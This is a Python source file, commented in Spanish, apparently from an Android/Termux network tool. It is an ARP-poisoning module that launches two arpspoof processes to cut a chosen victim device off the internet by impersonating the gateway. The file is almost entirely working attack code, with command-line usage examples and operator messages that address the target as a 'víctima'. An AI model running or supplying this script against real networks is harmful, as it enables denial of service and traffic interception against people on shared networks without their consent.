"""
╔══════════════════════════════════════════════════════════════════╗
║              DroidNet Spoofer v2 — ARP Poison Module             ║
║──────────────────────────────────────────────────────────────────║
║  Descripción:                                                    ║
║  Módulo de respuesta activa. Envenena las tablas ARP de un       ║
║  dispositivo objetivo para interrumpir su conectividad a         ║
║  internet sin afectar al resto de la red.                        ║
║                                                                  ║
║  ¿Por qué arpspoof y no Scapy?                                   ║
║  Scapy requiere acceso a raw sockets a nivel kernel. Android     ║
║  bloquea este acceso incluso con root. arpspoof (parte del       ║
║  paquete dsniff) usa implementación nativa compatible con        ║
║  el kernel de Android, por eso funciona en Termux.               ║
║                                                                  ║
║  Mecanismo de ataque:                                            ║
║  El envenenamiento ARP funciona enviando respuestas ARP          ║
║  falsas (gratuitous ARP) a dos objetivos simultáneamente:        ║
║  · A la víctima: "El gateway está en MI MAC"                     ║
║  · Al gateway : "La víctima está en MI MAC"                      ║
║  Resultado: el tráfico no llega a ningún lado → sin internet.    ║
║                                                                  ║
║  Al terminar (Ctrl+C), se restauran las entradas ARP             ║
║  legítimas para no dejar la red en estado inconsistente.         ║
║                                                                  ║
║  Dependencia externa:                                            ║
║  arpspoof → parte del paquete dsniff                             ║
║  Instalar: pkg install dsniff                                    ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ── Stdlib ────────────────────────────────────────────────────────
import subprocess  # Para ejecutar arpspoof como proceso externo
import sys         # Para sys.argv y sys.exit()
import os          # Para os.path y utilidades de sistema

# ── Terceros ──────────────────────────────────────────────────────
from rich import print as rprint  # Print con markup de colores Rich

# ── Módulos internos ──────────────────────────────────────────────
from platform_utils import check_root, get_default_iface


#  MÓDULO VERIFICACIÓN: Disponibilidad de arpspoof en el sistema

def check_arpspoof():
    """
    Verifica si arpspoof está instalado y disponible en el PATH.

    Usa `which` para localizar el binario en el sistema.
    Si returncode es 0, el binario existe y es ejecutable.
    Si returncode es 1, no está instalado.

    Returns:
        bool: True si arpspoof está disponible, False si no.
    """
    result = subprocess.run(
        ['which', 'arpspoof'],
        capture_output=True,
        text=True
    )
    return result.returncode == 0


#  CORE: Envenenamiento ARP bidireccional

def poison(target_ip, gateway_ip, iface="wlan0"):
    """
    Ejecuta el ataque de envenenamiento ARP contra un objetivo.

    Lanza DOS procesos arpspoof en paralelo (bidireccional):
    ┌─────────────────────────────────────────────────────────┐
    │ proc1: arpspoof -i wlan0 -t <VICTIMA>  <GATEWAY>        │
    │   → Le dice a la VÍCTIMA que el GATEWAY está en nuestra MAC  │
    │                                                         │
    │ proc2: arpspoof -i wlan0 -t <GATEWAY>  <VICTIMA>        │
    │   → Le dice al GATEWAY que la VÍCTIMA está en nuestra MAC    │
    └─────────────────────────────────────────────────────────┘

    El ataque necesita ser bidireccional para ser efectivo.
    Si solo se envenena a la víctima, el gateway sigue enviando
    paquetes legítimos y la conexión puede recuperarse sola.

    stdout/stderr de arpspoof se redirigen a DEVNULL porque
    su output es verboso y no aporta información útil al operador.

    Comportamiento en Ctrl+C:
    - Se terminan ambos procesos arpspoof
    - Se espera a que terminen limpiamente (wait)
    - arpspoof envía ARP replies legítimos al terminar,
      restaurando las tablas ARP de víctima y gateway

    Args:
        target_ip  (str): IP del dispositivo a cortar de la red
        gateway_ip (str): IP del router/gateway de la red
        iface      (str): Interfaz de red a usar (default: wlan0)
    """
    # Guard: verificamos que arpspoof esté disponible antes de continuar
    if not check_arpspoof():
        rprint("[bold red][✗] arpspoof no encontrado.[/bold red]")
        rprint("[dim]Instala con: pkg install dsniff[/dim]")
        return

    # Info del ataque al operador
    rprint(f"[bold red][☠][/bold red] Envenenando ARP...")
    rprint(f"  Víctima : [cyan]{target_ip}[/cyan]")
    rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
    rprint(f"  Iface   : [cyan]{iface}[/cyan]")
    rprint(f"  [dim]Ctrl+C para detener y restaurar.[/dim]\n")

    # ── Proceso 1: Envenenar a la víctima ─────────────────────────
    # "Víctima, el gateway (gateway_ip) está en MI dirección MAC"
    proc1 = subprocess.Popen(
        ['arpspoof', '-i', iface, '-t', target_ip, gateway_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # ── Proceso 2: Envenenar al gateway ───────────────────────────
    # "Gateway, la víctima (target_ip) está en MI dirección MAC"
    proc2 = subprocess.Popen(
        ['arpspoof', '-i', iface, '-t', gateway_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    rprint(f"[bold green][✓][/bold green] Ataque activo (PIDs: {proc1.pid}, {proc2.pid})")

    try:
        # Bloqueamos en proc1.wait() — el proceso corre indefinidamente
        # hasta que el usuario interrumpa con Ctrl+C
        proc1.wait()

    except KeyboardInterrupt:
        # ── Cleanup: restaurar red antes de salir ─────────────────
        rprint(f"\n[bold yellow][!][/bold yellow] Deteniendo y restaurando red...")

        # Terminamos ambos procesos — arpspoof envía
        # ARP replies legítimos como parte de su shutdown
        proc1.terminate()
        proc2.terminate()

        # Esperamos a que los procesos terminen el cleanup propio
        proc1.wait()
        proc2.wait()

        rprint("[bold green][✓][/bold green] Limpio. La víctima recobró internet.")


#  ENTRYPOINT

if __name__ == "__main__":
    """
    Uso standalone (línea de comandos):
        python spoofer.py <IP_VICTIMA> <IP_GATEWAY> [INTERFAZ]

    Ejemplos:
        python spoofer.py 192.168.1.105 192.168.1.1 wlan0
        python spoofer.py 192.168.1.105 192.168.1.1        ← usa wlan0 por defecto

    También puede ser importado y llamado como función desde sentinel.py:
        from spoofer import poison
        poison("192.168.1.105", "192.168.1.1", "wlan0")

    Requisitos:
        - Root: os.geteuid() == 0
        - arpspoof instalado: pkg install dsniff
    """

    # Guard: root es obligatorio para enviar paquetes ARP raw
    if not check_root():
        rprint("[red][✗] Necesitas root.[/red]")
        sys.exit(1)

    # Guard: mínimo 2 argumentos (víctima y gateway)
    if len(sys.argv) < 3:
        rprint("[yellow]Uso: python spoofer.py <IP_VICTIMA> <IP_GATEWAY> [INTERFAZ][/yellow]")
        rprint("[dim]Ejemplo: python spoofer.py 192.168.1.105 192.168.1.1 wlan0[/dim]")
        sys.exit(1)

    # Parseamos argumentos — interfaz es opcional, se autodetecta
    target  = sys.argv[1]
    gateway = sys.argv[2]
    iface   = sys.argv[3] if len(sys.argv) > 3 else get_default_iface()

    poison(target, gateway, iface)
